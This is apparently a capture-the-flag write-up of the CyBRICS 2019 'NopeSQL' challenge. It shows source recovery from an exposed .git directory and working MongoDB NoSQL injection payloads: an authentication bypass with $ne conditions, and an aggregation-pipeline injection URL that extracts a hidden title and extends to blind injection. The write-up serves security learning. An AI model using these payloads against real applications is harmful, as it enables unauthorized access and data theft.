NopeSQL - CYBRICS 2019
======================

> Maybe you can login and find unusual secret news
> 
> http://173.199.118.226/

Overview
--------
The wesite simply prompts a login-form and a list of news. Whenever we try to login, the `Invalid username or password` message is printed on the page. Providing the `"` character in the username or the password leads to an Internal Server Error (500).

Analysis
--------
The source code of the challenge is available as a git repository under the `http://173.199.118.226/.git/`. Even is fetching this resource ends up in a 404 error, we notice that `.git` suspiciously redirects to `.git/`.

```Bash
$ curl -I http://173.199.118.226/.git
HTTP/1.1 301 Moved Permanently
Server: nginx/1.15.5 (Ubuntu)
Date: Tue, 23 Jul 2019 22:30:53 GMT
Content-Type: text/html
Content-Length: 178
Location: http://173.199.118.226/.git/
Connection: keep-alive
```

Thanks to [GitTools](https://github.com/internetwache/GitTools) we are able to easily retrieve the source code of the PHP application.

```Bash
$ ./Dumper/gitdumper.sh http://173.199.118.226/.git/ /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src/
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src//.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/5c/9aa15f0b42bdbae8ffc0e80357ea72957e90ce
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/00/4ca2a6724f62951b8267d1ee5a12a2b7248777
[+] Downloaded: objects/f1/2f1389256c70b7b166b5de142bebbb1f6c8924
[+] Downloaded: objects/4d/3e2010278f7dc7eceb8d42ab1de225d378633c
[+] Downloaded: objects/49/dc44a4e5a450cc893cf7db463b2602dc7871c4
[+] Downloaded: objects/57/18be0cde5eaba0a86f746e5d1ed251ef78c2ab
[+] Downloaded: objects/37/ae92648ead157809a0700d47ac2b59ff38a127
[+] Downloaded: objects/5a/e761b02ec5c24e304a71585714e1933553ccd7
[+] Downloaded: objects/ce/97313c601f196a33af201f5fcb9b985e3ba959
[-] Downloaded: objects/f7/2816b43e74063c8b10357394b6bba8cb1c10de
[-] Downloaded: objects/bd/148eab0493e38354e45e2cd7db59b90fdcad79

$ ./Extractor/extractor.sh /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src/ /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src/
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 5c9aa15f0b42bdbae8ffc0e80357ea72957e90ce
[+] Found file: /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src//0-5c9aa15f0b42bdbae8ffc0e80357ea72957e90ce/composer.json
[+] Found file: /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src//0-5c9aa15f0b42bdbae8ffc0e80357ea72957e90ce/composer.lock
[+] Found file: /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src//0-5c9aa15f0b42bdbae8ffc0e80357ea72957e90ce/index.php
[+] Found commit: 004ca2a6724f62951b8267d1ee5a12a2b7248777
[+] Found file: /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src//1-004ca2a6724f62951b8267d1ee5a12a2b7248777/index.php
[+] Found commit: f12f1389256c70b7b166b5de142bebbb1f6c8924
[+] Found file: /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src//2-f12f1389256c70b7b166b5de142bebbb1f6c8924/composer.json
[+] Found file: /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src//2-f12f1389256c70b7b166b5de142bebbb1f6c8924/index.php
```

It is now possible to run the application to ease the exploitation process by being able to locally debug the code:

```Bash
$ cd /home/lavish/Repos/ctfteam/cybrics2019/nopeSQL/src/0-5c9aa15f0b42bdbae8ffc0e80357ea72957e90ce
$ composer install
Loading composer repositories with package information
Installing dependencies (including require-dev) from lock file
Package operations: 2 installs, 0 updates, 0 removals
  - Installing fzaninotto/faker (v1.8.0): Loading from cache
  - Installing mongodb/mongodb (1.4.2): Loading from cache
Generating autoload files
$ php -S 127.0.0.1:5001 -f index.php
```

Exploitation
------------
As the challenge name suggests, the challenge is about exploiting a NoSQL database, [MongoDB](https://docs.mongodb.com) in this case. A quick overview of the source code reveals how the authentication process is handled:

```PHP
function auth($username, $password) {
    $collection = (new MongoDB\Client('mongodb://localhost:27017/'))->test->users;
    $raw_query = '{"username": "'.$username.'", "password": "'.$password.'"}';
    $document = $collection->findOne(json_decode($raw_query));
    if (isset($document) && isset($document->password)) {
        return true;
    }
    return false;
}
```

Given that in the `findOne()` method, multiple keys separated by ',' are treated as `AND` conditions, the auth function can be bypassed by injecting two similar always true conditions in the username and the password. The resulting query looks like:

```Mongodb
{"username": "", "username": {"$ne": ""}, "$comment": "", "password": "", "password": {"$ne": ""}, "$comment": ""}
```

We are now prompted with a welcome message and the possibility of grouping the news by either category or publicity by providing to the GET variable filter the value `$category` or `$public`, respectively. The underlying PHP code is the following:

```PHP
<?php
    $filter = $_GET['filter'];

    $collection = (new MongoDB\Client('mongodb://localhost:27017/'))->test->news;

    $pipeline = [
        ['$group' => ['_id' => '$category', 'count' => ['$sum' => 1]]],
        ['$sort' => ['count' => -1]],
        ['$limit' => 5],
    ];

    $filters = [
        ['$project' => ['category' => $filter]]
    ];

    $cursor = $collection->aggregate(array_merge($filters, $pipeline));
?>

<?php if (isset($filter)): ?>

    <?php
        foreach ($cursor as $category) {
                printf("%s has %d news<br>", $category['_id'], $category['count']);
        }
    ?>

<?php endif; ?>
```

A further analysis of the source code reveals another field `title` for the documents in the `news` collection. By assuming that the flag lies in the title of a news, we can inject a filter to project only the titles starting with the `cybrics` string. Do to so, we can leverage the aggregation pipeline operator [`cond`](https://docs.mongodb.com/manual/reference/operator/aggregation/cond/) and return the title of those news having the following expression that evaluates to true:

```Mongodb
{'$eq': [{'$substr': ['$title', 0, 7]}, 'cybrics']}
```

Unfortunately, we have to consider that the data structure that constitutes the MongoDB query is put together by GET variables and thus all the values that we can feed into it are strings. To put it in a different way, we can't trivially have integer values for the `start` and `length` parameters of the [`substr`](https://docs.mongodb.com/manual/reference/operator/aggregation/substr/) operator. Given that these parameters can be any valid expression as long as long as they resolve to integers, there are multiple ways to bypass this restriction. The most obvious one is to convert strings into integers using the [`toInt`](https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/) operator. This operator is available starting from mongoDB v.4.0 and works reliably on the challenge server, but it is not supported by the MongoDB version shipped with my Ubuntu 18.04. So other backward-compatible-hackish-ways that _will do the job ™_ are returning the [year](https://docs.mongodb.com/manual/reference/operator/aggregation/year/) portion of a date or returning the number of bytes in a random string. We proceed with the former approach to achieve the result:

```Mongodb
{
  "$project": {
    "category": {
      "$cond": {
        "if": {
          "$eq": [
            {
              "$substr": [
                "$title",
                {
                  "$year": {
                    "$dateFromString": {
                      "dateString": "0000-02-08T12:10:40.787Z"
                    }
                  }
                },
                {
                  "$year": {
                    "$dateFromString": {
                      "dateString": "0007-02-08T12:10:40.787Z"
                    }
                  }
                }
              ]
            },
            "cybrics"
          ]
        },
        "then": "$title",
        "else": ""
      }
    }
  }
}
```

To avoid mistakes while encoding the parameters that will be transformed into the data structure used for the aggregate query, it is strongly advised to add a `print("<pre>".print_r($filter, true)."</pre>");` in the php code running locally. A working payload is provided below (each argument is placed on a single line to ease readability):

```
http://127.0.0.1:5001/
?filter[$cond][if][$eq][][$substr][]=$title
&filter[$cond][if][$eq][0][$substr][][$year][$dateFromString][dateString]=0000-02-08T12:10:40.787Z
&filter[$cond][if][$eq][0][$substr][][$year][$dateFromString][dateString]=0007-02-08T12:10:40.787Z
&filter[$cond][if][$eq][]=cybrics
&filter[$cond][then]=$title
&filter[$cond][else]=
```

See the script [nopesql.py](nopesql.py) to perform the exploitation automatically.

Also notice that this approach involving the `$substr` operator is perfectly suitable to mount a blind-noSQL injection and dump arbitrary fields by iterating over guesses on the value to increment the length of the known prefix.